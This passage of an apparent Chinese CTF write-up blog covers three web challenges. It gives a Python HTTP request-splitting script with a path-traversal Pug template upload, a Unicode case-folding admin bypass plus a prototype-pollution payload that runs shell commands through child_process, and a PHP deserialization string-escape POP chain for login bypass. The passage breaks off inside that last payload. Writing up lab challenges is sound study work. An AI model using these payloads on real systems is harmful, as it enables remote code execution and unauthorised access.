class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8</span><br><span class="line">import urllib.parse</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST &#x2F;file_upload HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------303312354614442</span><br><span class="line">Content-Length: 317</span><br><span class="line"></span><br><span class="line">-----------------------------303312354614442</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;v1sun.pug&quot;</span><br><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;- v1sun.pug</span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    style</span><br><span class="line">      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br><span class="line">      </span><br><span class="line">-----------------------------303312354614442--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: close</span><br><span class="line">x:&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</span><br><span class="line">payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</span><br><span class="line">#print(payload)</span><br><span class="line">#print (urllib.parse.quote(payload))</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;1b1aa7a2-6ecd-4a57-b9de-5bbebae5c2a0.node3.buuoj.cn&#x2F;core?q&#x3D;&#39;+ urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><code>Content-Type</code>处存在一个小trick，利用nodejs的目录穿越，上传到模板目录：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417211406.png" alt="image-20210417211406073"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br></pre></td></tr></table></figure><p>同时要修改：<code>Connection: keep-alive</code> 以至于让我们的所有请求包含进去</p><p>上传后访问：<code>?action=v1sun</code> 查看源码就得到flag</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417210638.png" alt="image-20210417210637714"></p><h3 id="WEB-Ez-Express"><a href="#WEB-Ez-Express" class="headerlink" title="[WEB]Ez_Express"></a>[WEB]Ez_Express</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404212051710.png" alt="image-20210404212051710"></p><p>但是ADMIN注册不了，利用TEST注册登录后查看源码：TEST 123456</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404212126997.png" alt="image-20210404212126997"></p><p>下载源码</p><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>审计发现是nodejs：app.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> indexRouter = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.disable(<span class="string">&#x27;etag&#x27;</span>);</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    secret: randomize(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line">app.use(logger(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(cookieParser());</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&#x27;/&#x27;</span>, indexRouter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  next(createError(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// error handler</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.locals.message = err.message;</span><br><span class="line">  res.locals.error = req.app.get(<span class="string">&#x27;env&#x27;</span>) === <span class="string">&#x27;development&#x27;</span> ? err : &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.status(err.status || <span class="number">500</span>);</span><br><span class="line">  res.render(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = app;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>app.js没什么特别关注的点。</p><p>index.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/info&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>看到了js原型链污染漏洞的标志性函数：<code>merge</code> 应该就是原型链污染了。</p><p>但是看到：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417215614.png" alt="image-20210417215614572"></p><p>ADMIN用户才可以触发<code>clone</code> 进而利用<code>merge</code>。但是限制了admin注册，看下注册登陆处：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417215956.png" alt="image-20210417215955907"></p><p>注册处会有验证，但是后边写入session的时候会经过<code>toUpperCase()</code>函数的处理，不由得想到了nodejs的大小写转换特性：</p><blockquote><p>对于toUpperCase():</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure><p>对于toLowerCase():</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p></blockquote><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>可见我们要想得到<code>ADMIN</code> 可以注册<code>admın</code> 经过处理就得到<code>ADMIN</code>：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417220456.png" alt="image-20210417220456007"></p><p>成功登陆。接下来就是原型链污染，首先寻找污染参数，看到存在<code>outputFunctionName</code>，并且<code>res.outputFunctionName=undefined;</code>在index页面渲染，那么可以构造payload污染参数，通过info页面触发，因为不能回显，可以反弹shell或者写入到一个文件内然后访问：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417225149.png" alt="image-20210417225148836"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag&#39;);var _tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>路径通过报错得到：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224238.png" alt="image-20210417224237777"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224605.png" alt="image-20210417224604692"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224723.png" alt="image-20210417224723183"></p><p>然后访问/flag 得到flag。</p><h3 id="WEB-Easyphp"><a href="#WEB-Easyphp" class="headerlink" title="[WEB]Easyphp"></a>[WEB]Easyphp</h3><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>扫描目录发现：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404184917405.png" alt="image-20210404184917405"></p><p>存在备份文件，下载代码审计：</p><p>admin 进入update页面 可得到flag</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404185032670.png" alt="image-20210404185032670"></p><p>查看是否存在注入：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404185139780.png" alt="image-20210404185139780"></p><p>存在预处理，因此无法注入</p><p>查询的sql语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,password from user where username&#x3D;?</span><br></pre></td></tr></table></figure><p>查询admin用户的密码，密码和数据库相等则登陆成功。</p><p>通过控制执行的语句即可绕过登录admin：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select id,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?  </span><br><span class="line">&#x2F;&#x2F;&quot;202cb962ac59075b964b07152d234b70&quot;为123的MD5，密码输入123即可</span><br></pre></td></tr></table></figure><p>接下来就是利用反序列化漏洞，构造pop链去执行sql语句：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190050208.png" alt="image-20210404190050208"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper类在结束时 会echo 调用魔术方法</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190403536.png" alt="image-20210404190403536"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">触发User的__toString()方法</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190518655.png" alt="image-20210404190518655"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用Info的__call()方法</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404191205555.png" alt="image-20210404191205555"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call 方法调用了login</span><br></pre></td></tr></table></figure><p>这里可以：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;CtrlCase 为dbCtrl类</span><br><span class="line">login参数为：$this-&gt;age传进来的</span><br></pre></td></tr></table></figure><p>pop 链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper::__destruct()-&gt;User::__toString()-&gt;Info::__call-&gt;dbCtrl::login</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404194116259.png" alt="image-20210404194116259"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>寻找反序列化入口：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404195102818.png" alt="image-20210404195102818"></p><p>update页面会调用update方法：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404194612300.png" alt="image-20210404194612300"></p><p>可见<code>$_POST[&#39;age&#39;]</code>与<code>$_POST[&#39;nickname&#39;]</code>可控，传入Info类实例化，然后反序列化，再经过safe函数处理。</p><p>可见如果我们直接传入payload，那么payload不会被识别为对象，而是字符串，但是这里我们看到了典型的反序列化字符串逃逸的形式，可以利用字符串逃逸：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211512856.png" alt="image-20210404211512856"></p><p>可见是一个字符增加的字符串逃逸。</p><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>Info()类正常序列化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;testage&quot;;s:8:&quot;nickname&quot;;s:8:&quot;testname&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>当把我们把payload作为nickname值传进去，为了拼接闭合，对payload改一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>即把payload当做Info()类正常序列化的N值，最后加}闭合，序列化之后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:265:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>可见要让我们的payload逃逸出来，必须多出265个字符，一个字符用一个union 替换为hacker，可见需要265个union，即nickname为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>序列化一下并用safe函数处理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1590:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;C